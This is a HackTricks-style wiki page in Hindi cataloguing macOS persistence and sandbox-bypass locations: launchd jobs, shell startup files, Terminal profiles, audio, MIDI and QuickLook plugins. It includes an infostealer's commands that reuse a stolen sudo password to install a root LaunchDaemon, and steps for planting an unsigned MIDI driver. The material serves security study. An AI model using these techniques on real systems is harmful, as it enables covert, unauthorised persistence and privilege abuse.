# macOS ऑटो स्टार्ट

{{#include ../banners/hacktricks-training.md}}

यह सेक्शन ब्लॉग शृंखला [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) पर काफी हद तक आधारित है। इसका उद्देश्य उन स्थानों की पहचान करना है जहाँ किसी फ़ाइल में लिखने से बाद में code execution हो सकता है, execution को ट्रिगर करने वाली घटना क्या है, और इसके लिए किन permissions की आवश्यकता है। किसी स्थान का मौजूद होना इस बात का प्रमाण नहीं है कि mechanism सक्षम है। नीचे दिए गए स्थानीय checks macOS 26.5.2 (5 अक्टूबर 2026) पर किए गए थे; वे हर macOS release के व्यवहार को स्थापित नहीं करते।

> [!NOTE]
> “Write-triggered” का अर्थ हमेशा यह नहीं होता कि “लिखने के तुरंत बाद चलता है।” कुछ स्थानों को केवल login पर, किसी खास application के शुरू होने पर, या उपयोगकर्ता द्वारा कोई कार्रवाई करने पर पढ़ा जाता है। पहले से configured job के अंदर writable payload होना, नया job register करने की permission से भी अलग है। किसी technique पर निर्भर होने से पहले उसे disposable account या VM में आज़माएँ।

## Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगी, जिनसे आप किसी चीज़ को **फ़ाइल में लिखकर** और किसी बहुत **आम** **कार्रवाई**, तय **समयावधि** या ऐसी **कार्रवाई** का इंतज़ार करके उसे execute कर सकते हैं जिसे आप आमतौर पर root permissions के बिना sandbox के अंदर से कर सकते हैं।

### Launchd

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`/Library/LaunchAgents`**
  - **ट्रिगर**: उपयोगकर्ता login (या explicit registration)
  - root आवश्यक
- **`/Library/LaunchDaemons`**
  - **ट्रिगर**: System boot (या explicit registration)
  - root आवश्यक
- **`/System/Library/LaunchAgents`**
  - **ट्रिगर**: उपयोगकर्ता login; Apple का सुरक्षित system location
- **`/System/Library/LaunchDaemons`**
  - **ट्रिगर**: System boot; Apple का सुरक्षित system location
- **`~/Library/LaunchAgents`**
  - **ट्रिगर**: दोबारा login करना

`launchd` द्वारा scan किया जाने वाला `~/Library/LaunchDaemons` location नहीं है। Per-user jobs `~/Library/LaunchAgents` में होते हैं; system daemon directory `/Library/LaunchDaemons` है। [Apple की launchd startup guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) scan किए जाने वाले locations का विवरण देती है।

> [!TIP]
> एक दिलचस्प तथ्य यह है कि **`launchd`** में Mach-o section `__Text.__config` में एक embedded property list है, जिसमें अन्य प्रसिद्ध services शामिल हैं जिन्हें launchd को शुरू करना होता है। इसके अलावा, इन services में `RequireSuccess`, `RequireRun` और `RebootOnSuccess` हो सकते हैं, जिनका अर्थ है कि उन्हें चलना और सफलतापूर्वक पूरा होना आवश्यक है।
>
> बेशक, code signing के कारण इसे संशोधित नहीं किया जा सकता।

#### विवरण और Exploitation

**`launchd`** **पहला** **process** है जिसे OX S kernel startup पर execute करता है और shutdown पर पूरा होने वाला आख़िरी process है। इसका **PID 1** ही होना चाहिए। यह process निम्नलिखित स्थानों में मौजूद **ASEP** **plists** में दिए गए configurations को **पढ़ेगा और execute करेगा**:

- `/Library/LaunchAgents`: Admin द्वारा install किए गए per-user agents
- `/Library/LaunchDaemons`: Admin द्वारा install किए गए system-wide daemons
- `/System/Library/LaunchAgents`: Apple द्वारा दिए गए per-user agents।
- `/System/Library/LaunchDaemons`: Apple द्वारा दिए गए system-wide daemons।

जब कोई उपयोगकर्ता login करता है, तो `launchd` उस उपयोगकर्ता की `~/Library/LaunchAgents` में मौजूद plists को उसी उपयोगकर्ता की permissions से load करता है। Jobs अपनी keys के अनुसार शुरू होते हैं; केवल plist load होने का अर्थ यह नहीं कि process तुरंत execute होगा।

**Agents और daemons के बीच मुख्य अंतर यह है कि agents उपयोगकर्ता के login करने पर load होते हैं और daemons system startup पर load होते हैं** (क्योंकि ssh जैसी services को किसी उपयोगकर्ता के system access करने से पहले execute करना होता है)। Agents GUI का उपयोग कर सकते हैं, जबकि daemons को background में चलना होता है।

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

`ProgramArguments` का हर element एक अलग argument होता है; `launchd` किसी एक string को shell command के रूप में parse नहीं करता। ऊपर दिए गए corrected example को लोड किए बिना `plutil -lint /path/to/example.plist` से syntax check किया जा सकता है। `ProgramArguments`, `RunAtLoad` और `KeepAlive` के लिए स्थानीय `man launchd.plist` entry देखें।

#### मौजूदा jobs में file-event triggers

**पहले से loaded** agent या daemon किसी named path में बदलाव होने पर शुरू होने के लिए `WatchPaths` का उपयोग कर सकता है। `QueueDirectories` किसी directory के non-empty रहने तक job शुरू करता है; `StartOnMount` volume mount होने पर शुरू करता है। [Apple's launchd guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) में `WatchPaths` और `QueueDirectories` के उदाहरण शामिल हैं। Watched file में write करने से **पहले से configured job** trigger होता है; इससे arbitrary code execution केवल तभी मिलता है जब लिखने वाला व्यक्ति job के executable, script या उस data को भी control कर सके जिसे job interpret करता है। किसी scanned या registered location के बाहर नई plist लिखने मात्र से वह load नहीं होती।

यह self-cleaning PoC एक विशिष्ट नाम वाला **temporary user agent** register करता है, केवल अपनी watched file में बदलाव करता है और agent को हटा देता है। इसे macOS 26.5.2 पर logout या restart के बिना सफलतापूर्वक चलाया गया था:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

लोकल रन ने `watch fired: True` प्रिंट किया, और `bootout` सफल रहा। यहाँ `launchctl bootstrap` का उपयोग केवल isolated PoC के अंदर किया गया है; पहले से लोड किए गए job के लिए इसकी **ज़रूरत नहीं** है। किसी मौजूदा job का सुरक्षित आकलन करने के लिए, उसकी plist और resolved `ProgramArguments` path पढ़ें, फिर बिना उसमें कोई बदलाव किए जाँचें कि संबंधित executable या interpreted file writable है या नहीं।

कुछ मामलों में, किसी **agent को user के login करने से पहले execute करना होता है**; इन्हें **PreLoginAgents** कहा जाता है। उदाहरण के लिए, login के समय assistive technology उपलब्ध कराने के लिए यह उपयोगी है। इन्हें `/Library/LaunchAgents` में भी पाया जा सकता है ([**यहाँ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) एक उदाहरण देखें)।

> [!TIP]
> नई Daemons या Agents की config files **अगले reboot के बाद या** `launchctl load <target.plist>` **का उपयोग करने पर लोड होंगी।** `.plist` extension के बिना भी plist files लोड करना **संभव है**: `launchctl -F <file>` (हालाँकि ऐसी plist files reboot के बाद अपने-आप लोड नहीं होंगी)।\
> `launchctl unload <target.plist>` **का उपयोग करके unload करना भी** संभव है (उससे इंगित process terminate हो जाएगा),
>
> यह **सुनिश्चित करने** के लिए कि कोई भी चीज़ (जैसे override) किसी **Agent** या **Daemon** को **चलने से रोक नहीं रही है**, यह चलाएँ: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

वर्तमान user द्वारा लोड किए गए सभी agents और daemons की सूची बनाएँ:

```bash
launchctl list
```

#### दुर्भावनापूर्ण LaunchDaemon चेन का उदाहरण (पासवर्ड का दोबारा इस्तेमाल)

हाल ही में एक macOS infostealer ने **कैप्चर किए गए sudo पासवर्ड** का दोबारा इस्तेमाल करके एक user agent और एक root LaunchDaemon बनाया:<sup>[[1]](#references)</sup>

- Agent loop को `~/.agent` में लिखें और उसे executable बनाएं।
- उस agent की ओर संकेत करने वाला plist `/tmp/starter` में जनरेट करें।
- चुराए गए पासवर्ड का `sudo -S` के साथ दोबारा इस्तेमाल करके उसे `/Library/LaunchDaemons/com.finder.helper.plist` में कॉपी करें, `root:wheel` सेट करें और `launchctl load` से लोड करें।
- आउटपुट को अलग करने के लिए `nohup ~/.agent >/dev/null 2>&1 &` के ज़रिए agent को चुपचाप शुरू करें।

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons` में रखी गई daemon plist, उसे user ownership देने से सुरक्षित नहीं हो जाती। `launchd` को system jobs के लिए उचित ownership और permissions चाहिए होती हैं और वह असुरक्षित plist को अस्वीकार कर सकता है। Root-owned daemon आम तौर पर root के रूप में चलता है, जब तक कि उसकी configuration में कोई दूसरा account न चुना गया हो। Job का `UserName`, `GroupName`, ownership और `launchctl` diagnostics जाँचें; केवल plist के owner के नाम से execution identity का अनुमान न लगाएँ।

#### launchd के बारे में अधिक जानकारी

**`launchd`**, **kernel** से शुरू होने वाली **पहली** user mode process है। इस process का शुरू होना **सफल** होना चाहिए और यह **बंद या crash नहीं हो सकती**। इसे कुछ **killing signals** से भी **सुरक्षित** रखा जाता है।

`launchd` सबसे पहले इन सभी **daemons** को **start** करता है:

- **समय के आधार पर चलने वाले Timer daemons**:
  - macOS 26.5.2 में `com.apple.atrun.plist`, `/usr/libexec/atrun` को `StartInterval = 30` सेकंड के साथ चलाती है; इसकी प्रभावी enabled स्थिति plist की `Disabled` key से अलग हो सकती है, क्योंकि `launchd` overrides को अलग से रखता है।
  - `com.vix.cron.plist`, `/usr/sbin/cron` को तब चलाती है जब `/usr/lib/cron/tabs` में jobs मौजूद हों। `com.apple.systemstats.daily` एक अलग scheduled service है, cron daemon नहीं।
- **Network daemons**, जैसे:
  - `org.cups.cups-lpd`: TCP (`SockType: stream`) पर `SockServiceName: printer` के साथ सुनता है
    - SockServiceName, `/etc/services` में दिया गया port या service होना चाहिए
  - `com.apple.xscertd.plist`: TCP port 1640 पर सुनता है
- **Path daemons**, जो किसी निर्दिष्ट path में बदलाव होने पर चलते हैं:
  - `com.apple.postfix.master`: `/etc/postfix/aliases` path की जाँच करता है
- **IOKit notifications daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: यह `MachServices` entry में `com.apple.xscertd.helper` नाम दर्शाती है
- **UserEventAgent:**
  - यह पिछले उदाहरण से अलग है। यह किसी विशेष event के जवाब में `launchd` से apps spawn करवाता है। हालाँकि, इस मामले में मुख्य binary `launchd` नहीं, बल्कि `/usr/libexec/UserEventAgent` है। यह SIP restricted folder `/System/Library/UserEventPlugins/` से plugins load करता है, जहाँ हर plugin अपना initialiser `XPCEventModuleInitializer` key में बताता है, या पुराने plugins के मामले में, अपने `Info.plist` की `CFPluginFactories` dict में `FB86416D-6164-2070-726F-70735C216EC0` key के तहत बताता है।

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको ऐसा app ढूँढ़ना होगा जिसमें TCC bypass हो और जो इन files को load करने वाला shell execute करे

#### Locations

- **`~/.zshenv`** (या इसका नया compiled रूप **`~/.zshenv.zwc`**)
  - **Trigger**: zsh का कोई भी सामान्य invocation, जिसमें noninteractive `zsh -c` भी शामिल है; `zsh -f` user startup files को skip करता है।
- **`~/.zshrc`**
  - **Trigger**: Interactive zsh शुरू होता है।
- **`~/.zprofile`, `~/.zlogin`**
  - **Trigger**: Login zsh शुरू होता है; ये क्रमशः `.zshrc` से पहले और बाद में पढ़ी जाती हैं।
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Trigger**: zsh के साथ terminal खोलें
  - Root आवश्यक है
- **`~/.zlogout`**
  - **Trigger**: Login zsh सामान्य रूप से बंद होता है; हर terminal या shell के बंद होने पर नहीं।
- **`/etc/zlogout`**
  - **Trigger**: zsh के साथ terminal बंद करें
  - Root आवश्यक है
- संभावित रूप से और जानकारी यहाँ: **`man zsh`**
- **`~/.bashrc`**
  - **Trigger**: Interactive **non-login** Bash शुरू करें। Interactive login Bash इसे तभी पढ़ता है जब कोई login file इसे स्पष्ट रूप से source करे।
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Trigger**: Login Bash शुरू करें; इस क्रम में पहली readable file चलती है। पहले की कोई भी file मौजूद होने पर `~/.profile` skip होती है।
- **`/etc/profile`**
  - **Trigger**: Login Bash शुरू करें; इसे बदलने के लिए root आवश्यक है।
- **`~/.tcshrc`** या, इसके न होने पर, **`~/.cshrc`**
  - **Trigger**: `tcsh` शुरू करें; इस Mac पर noninteractive `tcsh -c` भी शामिल है। User को वास्तव में `tcsh` चलाना होगा; यह macOS का default shell नहीं है।
- **`~/.login`**
  - **Trigger**: Login `tcsh` शुरू करें; यह उसकी rc file के बाद चलती है।
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Trigger**: xterm के साथ चलने की अपेक्षा है, लेकिन यह **installed नहीं है** और install करने के बाद भी यह error आता है: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### विवरण और Exploitation

`zsh` या `bash` जैसे shell environment शुरू करने पर **कुछ startup files चलती हैं**। macOS में फिलहाल `/bin/zsh` default shell है। Terminal या SSH login या interactive shell शुरू करता है या नहीं, यह उनकी configuration पर निर्भर करता है; यह न मानें कि हर session में ऊपर दी गई हर file चलती है। macOS में `bash` और `sh` भी मौजूद हैं, लेकिन उन्हें इस्तेमाल करने के लिए स्पष्ट रूप से invoke करना पड़ता है।<sup>[[2]](#references)</sup> [zsh startup-file reference](https://zsh.sourceforge.io/Doc/Release/Files.html) में files का क्रम, `ZDOTDIR` override और `.zwc` नियम बताए गए हैं।

नीचे दिया गया read-only experiment macOS 26.5.2 पर एक disposable `ZDOTDIR` का इस्तेमाल करता है। यह दिखाता है कि कौन-सी user files पढ़ी गईं; किसी भी वास्तविक shell startup file में बदलाव नहीं किया गया:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

देखा गया क्रम `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout` था। `ZDOTDIR` का वैकल्पिक डायरेक्टरी पर पहले से सेट होना ज़रूरी है; किसी भी मनमानी डायरेक्टरी में फ़ाइलें लिखना पर्याप्त नहीं है।

[Bash का startup संदर्भ](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) login और interactive shells में अंतर बताता है। macOS 26.5.2 टेस्ट मशीन पर, चारों user startup files वाले एक अलग `HOME` में ये परिणाम मिले: `bash -c` → कोई नहीं, `bash -ic` → `.bashrc`, `bash -lc` और `bash -lic` → केवल `.bash_profile`। `.bash_profile` हटाने पर login Bash ने `.bash_login` पढ़ा, और उसे भी हटाने पर `.profile` पढ़ा। `BASH_ENV` noninteractive Bash को किसी फ़ाइल की ओर निर्देशित कर सकता है, लेकिन यह environment variable invoking process में पहले से सेट होना चाहिए। Login Bash से स्पष्ट रूप से `exit` करने पर `~/.bash_logout` भी लोड हो सकता है।

स्थानीय `tcsh(1)` manual अपना अलग startup क्रम बताता है। अस्थायी `HOME` के साथ, `/bin/tcsh -c :` ने `.tcshrc` पढ़ा, या `.tcshrc` मौजूद न होने पर `.cshrc` पढ़ा। अस्थायी login `tcsh` ने `.tcshrc` और `.login` पढ़े। इन जाँचों में केवल अस्थायी फ़ाइलें बनाई और हटाई गईं।

### फिर से खोले गए Applications

> [!CAUTION]
> बताए गए exploitation को configure करने और logout करके फिर login करने, या यहाँ तक कि reboot करने पर भी परीक्षण में app execute नहीं हुआ। ये कार्रवाइयाँ करते समय app का चल रहा होना आवश्यक हो सकता है।

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Trigger**: Restart पर applications फिर से खोलना

#### विवरण और Exploitation

फिर से खोले जाने वाले सभी applications plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup> में होते हैं।

इसलिए, फिर से खुलने वाले applications से अपना app launch करवाने के लिए, आपको बस **अपना app सूची में जोड़ना है**।

UUID उस डायरेक्टरी की सूची देखकर या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` चलाकर पाया जा सकता है।

यह जाँचने के लिए कि कौन-से applications फिर से खोले जाएँगे, आप यह कर सकते हैं:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

इस सूची में **कोई एप्लिकेशन जोड़ने के लिए** आप इसका उपयोग कर सकते हैं:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal की प्राथमिकताएँ

लेख: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal का उपयोग करने वाले user के पास FDA permissions होती हैं

#### स्थान

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **ट्रिगर**: उस profile का उपयोग करके एक नई Terminal window या tab खोलें, जिसकी Shell settings में startup command मौजूद हो

#### विवरण और Exploitation

**`~/Library/Preferences`** में Applications में user की प्राथमिकताएँ संग्रहीत होती हैं। इनमें से कुछ प्राथमिकताओं में **दूसरे applications/scripts को execute करने** के लिए configuration हो सकता है।<sup>[[5]](#references)</sup>

उदाहरण के लिए, Terminal Startup में कोई command execute कर सकता है:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

यह config **`~/Library/Preferences/com.apple.Terminal.plist`** फ़ाइल में इस तरह दिखता है:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

यदि संबंधित profile में startup command मौजूद है और Terminal उस preference को पढ़ता है, तो उस profile का उपयोग करने वाला नया session उसे execute कर सकता है। [Apple की मौजूदा Terminal guide](https://support.apple.com/guide/terminal/trmlshll/mac) प्रति-profile **Shell → Startup** command के बारे में जानकारी देती है। उस profile का उपयोग करके नया session शुरू किए बिना केवल Terminal खोलना पर्याप्त नहीं है। नीचे दिए गए preference edits research Mac पर **नहीं** किए गए थे।

आप इसे cli से जोड़ सकते हैं:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / अन्य file extensions

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal का उपयोग करने से उपयोगकर्ता की FDA permissions मिल सकती हैं

#### Location

- **कहीं भी**
  - **Trigger**: संबंधित `.terminal`, `.command`, या `.tool` file खोलें

#### Description & Exploitation

यदि कोई उपयोगकर्ता **`.terminal`** settings file खोलता है, तो Terminal उसकी profile से एक session बना सकता है; executable **`.command`** और **`.tool`** files भी Terminal में खुल सकती हैं। यह file खोलने से trigger होता है; केवल Terminal खोलने से execution नहीं होता। विरासत में मिली TCC access, Terminal को मिले वास्तविक grants और किए गए operation पर निर्भर करती है। नीचे दिया गया ऐतिहासिक उदाहरण research Mac पर नहीं चलाया गया था।

इसे आज़माएँ:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

आप regular shell scripts content के साथ **`.command`**, **`.tool`** extensions का भी उपयोग कर सकते हैं; ये भी Terminal में खुलेंगे।

> [!CAUTION]
> अगर Terminal के पास **Full Disk Access** है, तो वह यह कार्रवाई पूरी कर पाएगा (ध्यान दें कि निष्पादित command Terminal window में दिखाई देगा)।

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Sandbox bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - आपको कुछ अतिरिक्त TCC access मिल सकता है

#### स्थान

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root आवश्यक है
  - **Trigger**: Core Audio server एक compatible HAL device plug-in लोड करता है; server को restart करने से फिर से खोज शुरू हो सकती है
- **`/Library/Audio/Plug-ins/Components`**
  - Root आवश्यक है
  - **Trigger**: कोई audio host इंस्टॉल किए गए Audio Unit को खोजता और instantiate करता है
- **`~/Library/Audio/Plug-ins/Components`**
  - **Trigger**: कोई audio host इंस्टॉल किए गए Audio Unit को खोजता और instantiate करता है
- **`/System/Library/Components`**
  - Apple द्वारा दिया गया, system-protected स्थान
  - **Trigger**: कोई audio host मेल खाते system component को instantiate करता है

#### विवरण

पिछले writeups के अनुसार, **कुछ audio plugins compile** करके उन्हें लोड करवाना संभव है।<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-ins और Audio Units के load paths अलग-अलग हैं। [Apple की Audio Unit hosting guide](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) के अनुसार, host को कोई component ढूँढकर instantiate करना होगा; किसी scan directory में उसे copy करने या `coreaudiod` को restart करने से अपने-आप यह साबित नहीं होता कि वह execute हुआ। AUv2 plug-ins host process में चलते हैं, जबकि [Apple की मौजूदा Audio Unit guidance](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) के अनुसार macOS पर AUv3 default रूप से अलग process में चलता है। Signature, sandbox और library-validation gates, host पर निर्भर करते हैं। Research Mac पर कोई audio plug-in इंस्टॉल या execute नहीं किया गया।

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Sandbox bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - आपका code आपके app के sandbox में नहीं, बल्कि `MIDIServer` process के अंदर चलता है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` अपने अलग `seatbelt` sandbox profile के अंतर्गत चलता है

#### स्थान

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root आवश्यक नहीं है (user-writable)
  - **Trigger**: `MIDIServer` दोबारा शुरू होता है। पहली बार कोई process CoreMIDI का उपयोग करता है, तो यह on demand लॉन्च होता है (*Audio MIDI Setup*, GarageBand, कोई DAW, या WebMIDI का उपयोग करने वाला कोई page खोलने पर)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root आवश्यक है
  - **Trigger**: ऊपर जैसा ही

#### विवरण और Exploitation

Apple का `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`), `Audio/MIDI Drivers` directories से MIDI **driver** bundles लोड करता है। यह binary Apple-signed है, लेकिन इसके साथ `com.apple.security.cs.disable-library-validation` entitlement आता है, इसलिए यह **unsigned या किसी दूसरी team द्वारा ad-hoc signed** bundle लोड कर सकता है। इससे **root के बिना**, Apple के स्वामित्व वाले एक अलग process के अंदर code execution मिलता है।<sup>[[53]](#references)</sup>

macOS 26 पर सत्यापित (केवल पढ़ने के लिए):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Driver एक standard bundle है जो `MIDIDriverInterface` factory export करता है; payload को factory/constructor में रखने से यह `MIDIServer` द्वारा drivers enumerate करते ही चलने लगता है। इसे build करें, `~/Library/Audio/MIDI Drivers/Evil.plugin` के रूप में रखें, फिर logout/reboot किए बिना load trigger करें:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - आपको कुछ अतिरिक्त TCC access मिल सकता है

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### विवरण और Exploitation

QuickLook plugins तब execute हो सकते हैं, जब आप **किसी फ़ाइल का preview trigger करते हैं** (Finder में फ़ाइल चुनकर space bar दबाएँ) और उस फ़ाइल type को support करने वाला **plugin** installed हो।<sup>[[8]](#references)</sup>

अपना QuickLook plugin compile करना, उसे load करने के लिए पिछली locations में से किसी एक पर रखना, और फिर किसी supported फ़ाइल पर जाकर उसे trigger करने के लिए space दबाना संभव है।

